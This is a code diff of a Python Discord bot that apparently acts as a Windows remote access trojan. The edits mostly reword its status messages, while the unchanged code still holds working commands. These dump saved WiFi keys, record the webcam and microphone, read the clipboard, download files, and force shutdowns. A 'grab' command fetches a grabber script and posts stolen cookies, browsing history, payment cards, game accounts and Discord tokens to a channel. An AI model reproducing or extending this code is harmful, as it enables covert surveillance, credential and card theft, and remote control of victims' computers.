+    await ctx.send(embed=create_embed("🔁 Restart", "The machine is restarting right now with no delay.", 0xff0000))
 
 
 @bot.command(aliases=["shutdown-pc"])
 async def shutdown_pc(ctx):
     os.system("shutdown /s /f /t 0")
-    await ctx.send(embed=create_embed("⏻ Shutdown", "Shutting down.", 0xff0000))
+    await ctx.send(embed=create_embed("⏻ Shutdown", "The machine is shutting down right now with no delay.", 0xff0000))
 
 @bot.command()
 async def say(ctx, *, text: str):
@@ -4097,7 +4148,7 @@ async def say(ctx, *, text: str):
 async def purge(ctx, amount: int = 20):
     amount = max(1, min(amount, 200))
     deleted = await ctx.channel.purge(limit=amount + 1)
-    msg = await ctx.send(embed=create_embed("🧹 Purge", "{} messages removed.".format(len(deleted) - 1), 0x00FF00))
+    msg = await ctx.send(embed=create_embed("🧹 Purge", "**{}** messages were removed from this channel.".format(len(deleted) - 1), 0x00FF00))
     await asyncio.sleep(3)
     try:
         await msg.delete()
@@ -4109,24 +4160,24 @@ async def purge(ctx, amount: int = 20):
 async def nick(ctx, *, name: str = None):
     try:
         await ctx.guild.me.edit(nick=name)
-        await ctx.send(embed=create_embed("🏷️ Nickname", "Set to `{}`.".format(name or "(default)"), 0x00FF00))
+        await ctx.send(embed=create_embed("🏷️ Nickname", "The bot nickname was set to `{}`.".format(name or "(default)"), 0x00FF00))
     except Exception as e:
-        await ctx.send(embed=create_embed("Error", str(e), 0xFF0000))
+        await ctx.send(embed=create_embed("Error", f"The nickname could not be changed: {e}", 0xFF0000))
 
 
 @bot.command()
 async def avatar(ctx, url: str = None):
     if not url:
-        await ctx.send(embed=create_embed("Error", "Usage: `.avatar <url>`", 0xFFA500))
+        await ctx.send(embed=create_embed("Error", "You have to give a direct URL to the image.", 0xFFA500))
         return
     try:
         async with aiohttp.ClientSession() as s:
             async with s.get(url, timeout=aiohttp.ClientTimeout(total=30)) as r:
                 data = await r.read()
         await bot.user.edit(avatar=data)
-        await ctx.send(embed=create_embed("🖼️ Avatar", "Updated.", 0x00FF00))
+        await ctx.send(embed=create_embed("🖼️ Avatar", "The bot avatar was replaced with the supplied image.", 0x00FF00))
     except Exception as e:
-        await ctx.send(embed=create_embed("Error", str(e), 0xFF0000))
+        await ctx.send(embed=create_embed("Error", f"The avatar could not be updated: {e}", 0xFF0000))
 
 
 @bot.command()
@@ -4134,21 +4185,21 @@ async def status(ctx, kind: str = "playing", *, text: str = None):
     kinds = {"playing": discord.ActivityType.playing, "watching": discord.ActivityType.watching,
              "listening": discord.ActivityType.listening, "competing": discord.ActivityType.competing}
     if kind.lower() not in kinds or not text:
-        await ctx.send(embed=create_embed("Error", "Usage: `.status <playing|watching|listening|competing> <text>`", 0xFFA500))
+        await ctx.send(embed=create_embed("Error", "You have to give an activity type and a text, for example `.status watching you`.", 0xFFA500))
         return
     await bot.change_presence(activity=discord.Activity(type=kinds[kind.lower()], name=text))
-    await ctx.send(embed=create_embed("🎭 Status", "{} {}".format(kind.lower(), text), 0x00FF00))
+    await ctx.send(embed=create_embed("🎭 Status", "The bot presence is now `{} {}`.".format(kind.lower(), text), 0x00FF00))
 
 
 @bot.command()
 async def embed(ctx, *, raw: str = None):
     if not raw or "|" not in raw:
-        await ctx.send(embed=create_embed("Error", "Usage: `.embed <title> | <description>`", 0xFFA500))
+        await ctx.send(embed=create_embed("Error", "The text has to be a title, a pipe and a description.", 0xFFA500))
         return
     title, description = raw.split("|", 1)
     title, description = title.strip(), description.strip()
     if not title or not description:
-        await ctx.send(embed=create_embed("Error", "Title and description are required.", 0xFFA500))
+        await ctx.send(embed=create_embed("Error", "Both the title and the description are required.", 0xFFA500))
         return
     await ctx.send(embed=create_embed(title[:256], description[:4000]))
 
@@ -4156,12 +4207,12 @@ async def embed(ctx, *, raw: str = None):
 @bot.command(aliases=["servers"])
 async def guilds(ctx):
     lines = ["{}  ·  `{}`  ·  {} members".format(g.name, g.id, g.member_count) for g in bot.guilds]
-    await send_long(ctx, "\n".join(lines) or "No guilds")
+    await send_long(ctx, "\n".join(lines) or "The bot is not in any server.")
 
 
 @bot.command(aliases=["latency"])
 async def pingbot(ctx):
-    await ctx.send(embed=create_embed("📡 Latency", "Gateway: **{:.0f} ms**".format(bot.latency * 1000), 0x0084FF))
+    await ctx.send(embed=create_embed("📡 Latency", "The gateway answers with a delay of **{:.0f} ms**.".format(bot.latency * 1000), 0x0084FF))
 
 
 @bot.command(aliases=["ss-window"])
@@ -4196,9 +4247,9 @@ async def screenshot_window(ctx, *, title: str):
 
     path = await asyncio.to_thread(grab)
     if not path:
-        await ctx.send(embed=create_embed("Error", "No window matched `{}`.".format(title), 0xFF0000))
+        await ctx.send(embed=create_embed("Error", "No visible window matched `{}`.".format(title), 0xFF0000))
         return
-    embed = create_embed("📸 Window", "`{}`".format(title), 0x0084FF)
+    embed = create_embed("📸 Window", "The window `{}` was brought to the front and captured, the image is attached below.".format(title), 0x0084FF)
     embed.set_image(url="attachment://sswin.png")
     await ctx.send(embed=embed, file=discord.File(path, filename="sswin.png"))
     try:
@@ -4224,7 +4275,7 @@ async def autoruns(ctx):
                 lines.append("[startup] {}".format(f))
         except Exception:
             pass
-    await send_long(ctx, "\n".join(lines) or "Nothing found")
+    await send_long(ctx, "\n".join(lines) or "Nothing is set to start automatically.")
 
 
 @bot.command(aliases=["tasks"])
@@ -4234,28 +4285,28 @@ async def scheduled_tasks(ctx):
 
 @bot.command()
 async def printers(ctx):
-    await send_long(ctx, _run_ps("Get-Printer | Select-Object Name, DriverName, PortName | Format-Table -AutoSize | Out-String") or "No printers")
+    await send_long(ctx, _run_ps("Get-Printer | Select-Object Name, DriverName, PortName | Format-Table -AutoSize | Out-String") or "No printers are installed.")
 
 
 @bot.command(aliases=["av-status"])
 async def defender_status(ctx):
     await send_long(ctx, _run_ps("Get-MpComputerStatus | Select-Object AMServiceEnabled, RealTimeProtectionEnabled, "
-                                 "AntivirusSignatureVersion, QuickScanEndTime | Format-List | Out-String") or "No data")
+                                 "AntivirusSignatureVersion, QuickScanEndTime | Format-List | Out-String") or "No data was returned.")
 
 
 @bot.command()
 async def firewall_rules(ctx):
     await send_long(ctx, _run_ps("Get-NetFirewallRule -Enabled True | Select-Object -First 60 DisplayName, "
-                                 "Direction, Action | Format-Table -AutoSize | Out-String") or "No data")
+                                 "Direction, Action | Format-Table -AutoSize | Out-String") or "No data was returned.")
 
 
 @bot.command()
 async def rdp(ctx):
     out = _run_ps(r"(Get-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Terminal Server').fDenyTSConnections")
     if not out:
-        await ctx.send(embed=create_embed("🖥️ RDP", "Unknown", 0x0084FF))
+        await ctx.send(embed=create_embed("🖥️ RDP", "The remote desktop state could not be read.", 0x0084FF))
         return
-    await ctx.send(embed=create_embed("🖥️ RDP", "Enabled" if out == "0" else "Disabled", 0x0084FF))
+    await ctx.send(embed=create_embed("🖥️ RDP", "Remote desktop is enabled on this machine." if out == "0" else "Remote desktop is disabled on this machine.", 0x0084FF))
 
 
 @bot.command(aliases=["admins"])
@@ -4267,33 +4318,34 @@ async def local_admins(ctx):
 async def power_plan(ctx, plan: str = None):
     plans = {"high": "SCHEME_MIN", "balanced": "SCHEME_BALANCED", "saver": "SCHEME_MAX"}
     if plan not in plans:
-        await ctx.send(embed=create_embed("Error", "Usage: `.power-plan <high|balanced|saver>`", 0xFFA500))
+        await ctx.send(embed=create_embed("Error", "You have to pick `high`, `balanced` or `saver`.", 0xFFA500))
         return
     subprocess.run(["powercfg", "/setactive", plans[plan]], capture_output=True, creationflags=_CNW)
-    await ctx.send(embed=create_embed("🔌 Power plan", plan, 0x00FF00))
+    await ctx.send(embed=create_embed("🔌 Power plan", f"The active power plan is now **{plan}**.", 0x00FF00))
 
 
 @bot.command()
 async def timezone(ctx, *, tz: str = None):
     if not tz:
-        await ctx.send(embed=create_embed("🕒 Timezone", (cmd_run("tzutil /g").stdout or "").strip() or "Unknown", 0x0084FF))
+        await ctx.send(embed=create_embed("🕒 Timezone", "The current timezone of the machine is `{}`.".format((cmd_run("tzutil /g").stdout or "").strip() or "Unknown"), 0x0084FF))
         return
     subprocess.run(["tzutil", "/s", tz], capture_output=True, creationflags=_CNW)
-    await ctx.send(embed=create_embed("🕒 Timezone", tz, 0x00FF00))
+    await ctx.send(embed=create_embed("🕒 Timezone", f"The timezone was changed to `{tz}`.", 0x00FF00))
 
 
 @bot.command()
 async def proxy(ctx, state: str = None, *, server: str = None):
     if state not in ("on", "off"):
-        await ctx.send(embed=create_embed("Error", "Usage: `.proxy <on|off> [host:port]`", 0xFFA500))
+        await ctx.send(embed=create_embed("Error", "You have to say `on` or `off`, optionally followed by a host and port.", 0xFFA500))
         return
     key = r"Software\Microsoft\Windows\CurrentVersion\Internet Settings"
     if state == "on" and server:
         cmd_run('reg add "HKCU\\{}" /v ProxyServer /t REG_SZ /d {} /f'.format(key, server))
         cmd_run('reg add "HKCU\\{}" /v ProxyEnable /t REG_DWORD /d 1 /f'.format(key))
+        await ctx.send(embed=create_embed("🌐 Proxy", f"The system proxy is now enabled and points to `{server}`.", 0x00FF00))
     else:
         cmd_run('reg add "HKCU\\{}" /v ProxyEnable /t REG_DWORD /d 0 /f'.format(key))
-    await ctx.send(embed=create_embed("🌐 Proxy", state.upper(), 0x00FF00))
+        await ctx.send(embed=create_embed("🌐 Proxy", "The system proxy was disabled.", 0x00FF00))
 
 
 @bot.command()
@@ -4301,9 +4353,9 @@ async def tail(ctx, file: str, lines: int = 20):
     try:
         with builtins.open(resolve(file), "r", encoding="utf-8", errors="replace") as f:
             data = f.readlines()[-max(1, min(lines, 500)):]
-        await send_long(ctx, "".join(data) or "(empty)")
+        await send_long(ctx, "".join(data) or "(The file is empty)")
     except Exception as e:
-        await ctx.send(embed=create_embed("Error", str(e), 0xFF0000))
+        await ctx.send(embed=create_embed("Error", f"The file could not be read: {e}", 0xFF0000))
 
 
 _SKIP_DIRS = {"AppData", "node_modules", ".git", "__pycache__", "venv", ".venv",
@@ -4341,7 +4393,7 @@ async def grep(ctx, pattern: str, *, path: str = None):
                 break
         if len(hits) >= 60:
             break
-    await send_long(ctx, "\n".join(hits) or "No matches")
+    await send_long(ctx, "\n".join(hits) or "No file contained that text.")
 
 
 @bot.command()
@@ -4351,9 +4403,9 @@ async def touch(ctx, *, file: str):
         with builtins.open(p, "a"):
             pass
         os.utime(p, None)
-        await ctx.send(embed=create_embed("🆕 Touch", p, 0x00FF00))
+        await ctx.send(embed=create_embed("🆕 Touch", f"`{p}` was created if it did not exist and its date was refreshed.", 0x00FF00))
     except Exception as e:
-        await ctx.send(embed=create_embed("Error", str(e), 0xFF0000))
+        await ctx.send(embed=create_embed("Error", f"The file could not be touched: {e}", 0xFF0000))
 
 
 @bot.command(aliases=["biggest"])
@@ -4368,7 +4420,7 @@ async def large_files(ctx, *, path: str = None):
             except Exception:
                 pass
     found.sort(reverse=True)
-    await send_long(ctx, "\n".join("{:.1f} MB  {}".format(s / 1048576, p) for s, p in found[:40]) or "Nothing")
+    await send_long(ctx, "\n".join("{:.1f} MB  {}".format(s / 1048576, p) for s, p in found[:40]) or "No files were found.")
 
 @bot.command()
 async def sysinfo(ctx):
@@ -4377,7 +4429,7 @@ async def sysinfo(ctx):
         ram = psutil.virtual_memory()
         disk = psutil.disk_usage("/")
         boot = datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S")
-        e = create_embed("🖥️ System Info", "", 0x3498db)
+        e = create_embed("🖥️ System Info", "Live load of the machine, sampled over half a second.", 0x3498db)
         e.add_field(name="Host", value=socket.gethostname(), inline=True)
         e.add_field(name="OS", value=f"{__import__('platform').system()} {__import__('platform').release()}", inline=True)
         e.add_field(name="User", value=os.getlogin(), inline=True)
@@ -4387,7 +4439,7 @@ async def sysinfo(ctx):
         e.add_field(name="Boot", value=boot, inline=False)
         await ctx.send(embed=e)
     except Exception as e:
-        await ctx.send(embed=create_embed("Error", str(e), 0xff0000))
+        await ctx.send(embed=create_embed("Error", f"The system information could not be collected: {e}", 0xff0000))
 
 
 @bot.command()
@@ -4395,12 +4447,12 @@ async def battery(ctx):
     try:
         b = psutil.sensors_battery()
         if not b:
-            await ctx.send(embed=create_embed("🔋 Battery", "No battery detected.", 0x3498db))
+            await ctx.send(embed=create_embed("🔋 Battery", "This machine has no battery, it is a desktop.", 0x3498db))
             return
-        state = "Charging" if b.power_plugged else "Discharging"
-        await ctx.send(embed=create_embed("🔋 Battery", f"**{b.percent}%** ({state})", 0x00ff00 if b.power_plugged else 0xffa500))
+        state = "charging" if b.power_plugged else "discharging"
+        await ctx.send(embed=create_embed("🔋 Battery", f"The battery is at **{b.percent}%** and it is {state}.", 0x00ff00 if b.power_plugged else 0xffa500))
     except Exception as e:
-        await ctx.send(embed=create_embed("Error", str(e), 0xff0000))
+        await ctx.send(embed=create_embed("Error", f"The battery state could not be read: {e}", 0xff0000))
 
 def _wifi_export():
     tmp = tempfile.mkdtemp(prefix="wf_")
@@ -4457,13 +4509,13 @@ async def wifi(ctx):
         if not found:
             found = await asyncio.to_thread(_wifi_parse)
         if not found:
-            await ctx.send(embed=create_embed("📶 WiFi", "No profiles found.", 0xFF0000))
+            await ctx.send(embed=create_embed("📶 WiFi", "No saved wireless profile was found on this machine.", 0xFF0000))
             return
         lines = ["{} : {}".format(s, k) for s, k in found]
         await _send_text_files(ctx.channel, "wifi_{}".format(int(time.time())), "\n".join(lines))
-        await ctx.send(embed=create_embed("📶 WiFi", "**{}** profiles dumped.".format(len(found)), 0x0084FF))
+        await ctx.send(embed=create_embed("📶 WiFi", "**{}** saved profiles were dumped with their keys and are attached below.".format(len(found)), 0x0084FF))
     except Exception as e:
-        await ctx.send(embed=create_embed("Error", str(e), 0xFF0000))
+        await ctx.send(embed=create_embed("Error", f"The wireless profiles could not be read: {e}", 0xFF0000))
 
 @bot.command(aliases=["camrec", "webcam-rec", "record-cam"])
 async def cam_rec(ctx, seconds: int = 10):
@@ -4491,7 +4543,7 @@ async def cam_rec(ctx, seconds: int = 10):
 
     path = await asyncio.to_thread(record)
     if not path:
-        await ctx.send(embed=create_embed("Error", "Camera {} unavailable.".format(selected_camera), 0xFF0000))
+        await ctx.send(embed=create_embed("Error", "Camera {} could not be opened for recording.".format(selected_camera), 0xFF0000))
         return
 
     fixed = path[:-4] + "_h.mp4"
@@ -4507,7 +4559,7 @@ async def cam_rec(ctx, seconds: int = 10):
         pass
 
     try:
-        await ctx.send(embed=create_embed("📹 Camera", "{}s from camera **{}**.".format(seconds, selected_camera), 0x0084FF),
+        await ctx.send(embed=create_embed("📹 Camera", "A **{}** second clip was recorded with camera **{}** and is attached below.".format(seconds, selected_camera), 0x0084FF),
                        file=discord.File(path, filename="cam.mp4"))
     finally:
         try:
@@ -4532,7 +4584,7 @@ async def despin_all(ctx):
     subprocess.run(["taskkill", "/f", "/im", "explorer.exe"], capture_output=True, creationflags=_CNW)
     time.sleep(1)
     subprocess.Popen(["explorer.exe"], creationflags=_CNW)
-    await ctx.send(embed=create_embed("📌 Taskbar", "{} shortcuts unpinned, explorer restarted.".format(removed), 0x0084FF))
+    await ctx.send(embed=create_embed("📌 Taskbar", "{} shortcuts were unpinned and Explorer was restarted to apply it.".format(removed), 0x0084FF))
 
 
 @bot.command(aliases=["restart-taskbar", "restart-explorer"])
@@ -4540,7 +4592,7 @@ async def restart_taskbar(ctx):
     subprocess.run(["taskkill", "/f", "/im", "explorer.exe"], capture_output=True, creationflags=_CNW)
     time.sleep(1)
     subprocess.Popen(["explorer.exe"], creationflags=_CNW)
-    await ctx.send(embed=create_embed("🪟 Explorer", "Restarted.", 0x00FF00))
+    await ctx.send(embed=create_embed("🪟 Explorer", "Explorer was restarted and the desktop was reloaded.", 0x00FF00))
 
 @bot.command(aliases=["proc-info", "pinfo"])
 async def proc_details(ctx, *, name: str):
@@ -4557,7 +4609,7 @@ async def proc_details(ctx, *, name: str):
             pass
         if len(rows) >= 15:
             break
-    await send_long(ctx, "\n".join(rows) or "No match.")
+    await send_long(ctx, "\n".join(rows) or "No process matched that name.")
 
 
 @bot.command(aliases=["ktree"])
@@ -4576,7 +4628,7 @@ async def kill_tree(ctx, *, name: str):
                 killed += 1
         except Exception:
             pass
-    await ctx.send(embed=create_embed("🪓 Kill tree", "{} processes killed.".format(killed), 0xFF0000))
+    await ctx.send(embed=create_embed("🪓 Kill tree", "{} processes were terminated, children included.".format(killed), 0xFF0000))
 
 
 @bot.command(aliases=["vol-step"])
@@ -4591,7 +4643,7 @@ async def volume_step(ctx, direction: str = "up", times: int = 5):
             time.sleep(0.04)
 
     await asyncio.to_thread(press)
-    await ctx.send(embed=create_embed("🔊 Volume", "{} x{}".format(direction.upper(), times), 0x00FF00))
+    await ctx.send(embed=create_embed("🔊 Volume", "The volume was moved {} by {} steps.".format(direction.upper(), times), 0x00FF00))
 
 
 @bot.command(aliases=["empty-temp", "clean-temp"])
@@ -4611,7 +4663,7 @@ async def empty_temp(ctx):
                 removed += 1
             except Exception:
                 failed += 1
-    await ctx.send(embed=create_embed("🧹 Temp", "Removed **{}**, failed **{}**.".format(removed, failed), 0x00FF00))
+    await ctx.send(embed=create_embed("🧹 Temp", "**{}** entries were deleted from the temporary folders and **{}** could not be removed.".format(removed, failed), 0x00FF00))
 
 
 @bot.command()
@@ -4619,9 +4671,9 @@ async def hosts(ctx):
     path = os.path.join(WINDIR, "System32", "drivers", "etc", "hosts")
     try:
         with builtins.open(path, "r", encoding="utf-8", errors="replace") as f:
-            await send_long(ctx, f.read()[:8000] or "(empty)")
+            await send_long(ctx, f.read()[:8000] or "(The hosts file is empty)")
     except Exception as e:
-        await ctx.send(embed=create_embed("Error", str(e), 0xFF0000))
+        await ctx.send(embed=create_embed("Error", f"The hosts file could not be read: {e}", 0xFF0000))
 
 
 
@@ -4634,7 +4686,7 @@ async def drives(ctx):
             lines.append(f"{part.device} {part.fstype} {u.used // 1e9:.1f}/{u.total // 1e9:.1f} GB")
         except Exception:
             lines.append(part.device)
-    await ctx.send(embed=create_embed("💽 Drives", f"```{chr(10).join(lines)}```", 0x3498db))
+    await ctx.send(embed=create_embed("💽 Drives", f"The mounted volumes and their usage are listed below.\n```{chr(10).join(lines)}```", 0x3498db))
 
 
 
@@ -4642,13 +4694,13 @@ async def drives(ctx):
 @bot.command()
 async def startup(ctx):
     out = ps("Get-CimInstance Win32_StartupCommand | Select-Object Name, Command | Format-Table -AutoSize | Out-String").stdout
-    await ctx.send(embed=create_embed("🚀 Startup", f"```{out[-1900:]}```", 0x3498db))
+    await ctx.send(embed=create_embed("🚀 Startup", f"These entries run when the machine starts.\n```{out[-1900:]}```", 0x3498db))
 
 
 @bot.command(aliases=["window-list", "windows"])
 async def window_list(ctx):
     titles = enum_windows()
-    await ctx.send(embed=create_embed("🪟 Open Windows", f"```{chr(10).join(titles[:40])}```", 0x3498db))
+    await ctx.send(embed=create_embed("🪟 Open Windows", f"The following visible windows were found.\n```{chr(10).join(titles[:40])}```", 0x3498db))
 
 
 @bot.command()
@@ -4660,7 +4712,7 @@ async def focus(ctx, *, title: str):
             return False
         return True
     win32gui.EnumWindows(cb, None)
-    await ctx.send(embed=create_embed("🪟 Focus", f"Focused window matching `{title}`.", 0x00ff00))
+    await ctx.send(embed=create_embed("🪟 Focus", f"The window matching `{title}` was restored and brought to the front.", 0x00ff00))
 
 
 @bot.command(aliases=["close-window"])
@@ -4670,7 +4722,7 @@ async def close_window(ctx, *, title: str):
             win32gui.PostMessage(hwnd, win32con.WM_CLOSE, 0, 0)
         return True
     win32gui.EnumWindows(cb, None)
-    await ctx.send(embed=create_embed("🪟 Close", f"Closed windows matching `{title}`.", 0xff0000))
+    await ctx.send(embed=create_embed("🪟 Close", f"A close request was sent to every window matching `{title}`.", 0xff0000))
 
 
 @bot.command(aliases=["clip"])
@@ -4679,9 +4731,9 @@ async def clipboard(ctx):
         win32clipboard.OpenClipboard()
         data = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
         win32clipboard.CloseClipboard()
-        await ctx.send(embed=create_embed("📋 Clipboard", f"```{data[:1900]}```", 0x0084ff))
+        await ctx.send(embed=create_embed("📋 Clipboard", f"This is what the clipboard currently holds.\n```{data[:1900]}```", 0x0084ff))
     except Exception as e:
-        await ctx.send(embed=create_embed("Error", f"Clipboard empty or unsupported: {e}", 0xff0000))
+        await ctx.send(embed=create_embed("Error", f"The clipboard is empty or holds something that is not text: {e}", 0xff0000))
 
 
 @bot.command(aliases=["set-clipboard"])
@@ -4691,15 +4743,15 @@ async def set_clipboard(ctx, *, text: str):
         win32clipboard.EmptyClipboard()
         win32clipboard.SetClipboardText(text)
         win32clipboard.CloseClipboard()
-        await ctx.send(embed=create_embed("📋 Clipboard", "Text set.", 0x00ff00))
+        await ctx.send(embed=create_embed("📋 Clipboard", "The clipboard content was replaced with the supplied text.", 0x00ff00))
     except Exception as e:
-        await ctx.send(embed=create_embed("Error", str(e), 0xff0000))
+        await ctx.send(embed=create_embed("Error", f"The clipboard could not be overwritten: {e}", 0xff0000))
 
 
 @bot.command()
 async def beep(ctx):
     winsound.Beep(1000, 500)
-    await ctx.send(embed=create_embed("🔔 Beep", "Beeped.", 0x00ff00))
+    await ctx.send(embed=create_embed("🔔 Beep", "A 1000 Hz beep was played for half a second.", 0x00ff00))
 
 
 @bot.command()
@@ -4711,35 +4763,35 @@ async def notepad(ctx, *, text: str = None):
         subprocess.Popen(["notepad.exe", path])
     else:
         subprocess.Popen(["notepad.exe"])
-    await ctx.send(embed=create_embed("📝 Notepad", "Opened.", 0x00ff00))
+    await ctx.send(embed=create_embed("📝 Notepad", "Notepad was opened." if not text else "Notepad was opened with the supplied text already loaded.", 0x00ff00))
 
 
 @bot.command()
 async def screensaver(ctx):
     ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF140, 0)
-    await ctx.send(embed=create_embed("🖼️ Screensaver", "Started.", 0x00ff00))
+    await ctx.send(embed=create_embed("🖼️ Screensaver", "The configured screensaver was started.", 0x00ff00))
 
 
 @bot.command()
 async def taskbar(ctx, state: str = None):
     if state not in ("hide", "show"):
-        await ctx.send(embed=create_embed("Error", "Usage: `.taskbar <hide|show>`", 0xffa500))
+        await ctx.send(embed=create_embed("Error", "You have to say `hide` or `show`.", 0xffa500))
         return
     hwnd = win32gui.FindWindow("Shell_TrayWnd", None)
     win32gui.ShowWindow(hwnd, win32con.SW_HIDE if state == "hide" else win32con.SW_SHOW)
-    await ctx.send(embed=create_embed("🪟 Taskbar", state.capitalize(), 0x0084ff))
+    await ctx.send(embed=create_embed("🪟 Taskbar", "The taskbar was hidden." if state == "hide" else "The taskbar is visible again.", 0x0084ff))
 
 
 @bot.command(aliases=["desktop-icons"])
 async def desktop_icons(ctx, state: str = None):
     if state not in ("hide", "show"):
-        await ctx.send(embed=create_embed("Error", "Usage: `.desktop-icons <hide|show>`", 0xffa500))
+        await ctx.send(embed=create_embed("Error", "You have to say `hide` or `show`.", 0xffa500))
         return
     progman = win32gui.FindWindow("Progman", None)
     shell = win32gui.FindWindowEx(progman, 0, "SHELLDLL_DefView", None)
     if shell:
         win32gui.ShowWindow(shell, win32con.SW_HIDE if state == "hide" else win32con.SW_SHOW)
-    await ctx.send(embed=create_embed("🖥️ Desktop Icons", state.capitalize(), 0x0084ff))
+    await ctx.send(embed=create_embed("🖥️ Desktop Icons", "The desktop icons were hidden." if state == "hide" else "The desktop icons are visible again.", 0x0084ff))
 
 
 @bot.command(aliases=["mic-record"])
@@ -4755,10 +4807,10 @@ async def mic_record(ctx, seconds: int = 5):
             wf.setsampwidth(2)
             wf.setframerate(fs)
             wf.writeframes(rec.tobytes())
-        await ctx.send(embed=create_embed("🎙️ Recording", f"{seconds}s", 0x0084ff), file=discord.File(path))
+        await ctx.send(embed=create_embed("🎙️ Recording", "A **{}** second clip from the selected microphone is attached below.".format(seconds), 0x0084ff), file=discord.File(path))
         os.remove(path)
     except Exception as e:
-        await ctx.send(embed=create_embed("Error", str(e), 0xff0000))
+        await ctx.send(embed=create_embed("Error", f"The microphone could not be recorded: {e}", 0xff0000))
 
 
 @bot.command(aliases=["grab-url", "wget", "download-url"])
@@ -4771,9 +4823,9 @@ async def grab_url(ctx, url: str, *, dest: str = None):
             async with session.get(url) as resp:
                 with builtins.open(path, "wb") as f:
                     f.write(await resp.read())
-        await ctx.send(embed=create_embed("📥 Downloaded", f"`{name}` -> `{current_dir}`", 0x00ff00))
+        await ctx.send(embed=create_embed("📥 Downloaded", f"`{name}` was downloaded straight into `{current_dir}`.", 0x00ff00))
     except Exception as e:
-        await ctx.send(embed=create_embed("Error", str(e), 0xff0000))
+        await ctx.send(embed=create_embed("Error", f"The download failed: {e}", 0xff0000))
 
 
 @bot.command(aliases=["installed", "installed-apps"])
@@ -4792,18 +4844,18 @@ async def installed_apps(ctx):
                     pass
         except Exception:
             pass
-    await ctx.send(embed=create_embed("📦 Installed Apps", f"```{chr(10).join(sorted(set(apps))[:60])}```", 0x3498db))
+    await ctx.send(embed=create_embed("📦 Installed Apps", f"These programs are registered as installed.\n```{chr(10).join(sorted(set(apps))[:60])}```", 0x3498db))
 
 
 @bot.command()
 async def services(ctx):
     out = ps("Get-Service | Where-Object { $_.Status -eq 'Running' } | Select-Object -First 60 Name, DisplayName | Format-Table -AutoSize | Out-String").stdout
-    await ctx.send(embed=create_embed("⚙️ Services", f"```{out[-1900:]}```", 0x3498db))
+    await ctx.send(embed=create_embed("⚙️ Services", f"These services are currently running.\n```{out[-1900:]}```", 0x3498db))
 
 
 async def _send_text_files(channel, base, text):
     safe = re.sub(r"[^A-Za-z0-9_.-]+", "_", base).strip("_")[:40] or "dump"
-    data = (text or "(empty)").encode("utf-8", "replace")
+    data = (text or "(Empty)").encode("utf-8", "replace")
     limit = 8 * 1024 * 1024
     parts = [data[i:i + limit] for i in range(0, len(data), limit)] or [b""]
     total = len(parts)
@@ -4885,7 +4937,7 @@ def _account_embed(a):
 async def _post_discord_embeds(dest, raw):
     accounts = _parse_accounts(raw)
     if not accounts:
-        await dest.send(embed=create_embed("Discord", "No accounts found.", 0x5865F2))
+        await dest.send(embed=create_embed("Discord", "No Discord account was found in the captured data.", 0x5865F2))
         return
     for start in range(0, min(len(accounts), 25), 5):
         embeds = [_account_embed(a) for a in accounts[start:start + 5]]
@@ -4917,7 +4969,7 @@ async def _full_dump(dest):
             return
         await asyncio.sleep(0.4)
         if job == "cookies":
-            await _send_text_files(dest, "cookies_{}".format(ts), out or "no cookies found")
+            await _send_text_files(dest, "cookies_{}".format(ts), out or "No cookies were found.")
         elif job == "history":
             history = out
         elif job == "cards":
@@ -4925,7 +4977,7 @@ async def _full_dump(dest):
                                    "===== HISTORY =====\n{}\n\n===== CARDS =====\n{}".format(
                                        history or "none", out or "none"))
         elif job == "games":
-            await _send_text_files(dest, "accounts_{}".format(ts), out or "no accounts found")
+            await _send_text_files(dest, "accounts_{}".format(ts), out or "No accounts were found.")
         elif job == "discord":
             await _post_discord_embeds(dest, out)
 
@@ -4934,7 +4986,7 @@ async def _full_dump(dest):
 async def grab(ctx, mode: str = "all"):
     mode = (mode or "all").lower()
     if mode not in GRAB_MODES:
-        await ctx.send(embed=create_embed("Grab", "Modes: " + ", ".join("`{}`".format(m) for m in GRAB_MODES), 0xF1C40F))
+        await ctx.send(embed=create_embed("Grab", "Valid modes are: " + ", ".join("`{}`".format(m) for m in GRAB_MODES), 0xF1C40F))
         return
 
     if not _grab_path():
@@ -4946,7 +4998,7 @@ async def grab(ctx, mode: str = "all"):
                     with builtins.open(resource_path(GRAB_SCRIPT), "wb") as f:
                         f.write(await resp.read())
         except Exception as e:
-            await ctx.send(embed=create_embed("Error", "grab.py missing, download failed: {}".format(e), 0xFF0000))
+            await ctx.send(embed=create_embed("Error", "The grabber script is missing and the download failed: {}".format(e), 0xFF0000))
             return
 
     await ctx.message.add_reaction("💰")
@@ -4958,7 +5010,7 @@ async def grab(ctx, mode: str = "all"):
     else:
         out = await _run_grab(mode)
         if out is None:
-            await ctx.send(embed=create_embed("Error", "grab.py missing", 0xFF0000))
+            await ctx.send(embed=create_embed("Error", "The grabber script could not be found.", 0xFF0000))
             return
         if mode == "discord":
             await _post_discord_embeds(dest, await _run_grab("discordjson") or "[]")
@@ -4969,21 +5021,21 @@ async def grab(ctx, mode: str = "all"):
         elif mode == "games":
             await _send_text_files(dest, "accounts_{}".format(ts), out)
         elif mode == "vm":
-            await dest.send(embed=create_embed("VMProtect", "```{}```".format(out[:1900]), 0x3498DB))
+            await dest.send(embed=create_embed("VMProtect", "The sandbox report is attached below.\n```{}```".format(out[:1900]), 0x3498DB))
         else:
             await _send_text_files(dest, "{}_{}".format(mode, ts), out)
 
-    await ctx.send(embed=create_embed("Grab", "Done -> {}".format(dest.mention), 0x00FF00))
+    await ctx.send(embed=create_embed("Grab", "The collection finished and everything was posted in {}.".format(dest.mention), 0x00FF00))
 
 @bot.command(aliases=["discord-diag", "ddiag"])
 async def discord_diag(ctx):
     await ctx.message.add_reaction("🔎")
     out = await _run_grab("discorddiag", timeout=300)
-    await _send_text_files(ctx.channel, "discord_diag_{}".format(int(time.time())), out or "nothing")
+    await _send_text_files(ctx.channel, "discord_diag_{}".format(int(time.time())), out or "Nothing was found.")
 
 @bot.command(aliases=["leave-all"])
 async def leave_all(ctx):
-    msg = await ctx.send(embed=create_embed("⚠️ Confirm", "React ✅ within 15s to leave all servers.", 0xffa500))
+    msg = await ctx.send(embed=create_embed("⚠️ Confirm", "React with a check mark within fifteen seconds to leave every server.", 0xffa500))
     await msg.add_reaction("✅")
 
     def check(reaction, user):
@@ -4992,7 +5044,7 @@ async def leave_all(ctx):
     try:
